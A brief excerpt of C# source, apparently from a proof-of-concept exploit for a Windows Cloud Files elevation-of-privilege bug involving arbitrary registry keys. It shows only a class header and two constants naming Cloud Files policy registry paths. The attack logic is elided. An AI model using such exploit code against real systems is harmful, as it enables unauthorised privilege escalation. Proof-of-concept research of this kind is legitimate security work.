...
namespace PoC_AbortHydration_ArbitraryRegKey_EoP
{
    static class Program
    {
        ...
        static string CLOUD_FILES = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft\CloudFiles";
        static string BLOCKED_APPS = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft\CloudFiles\BlockedApps";
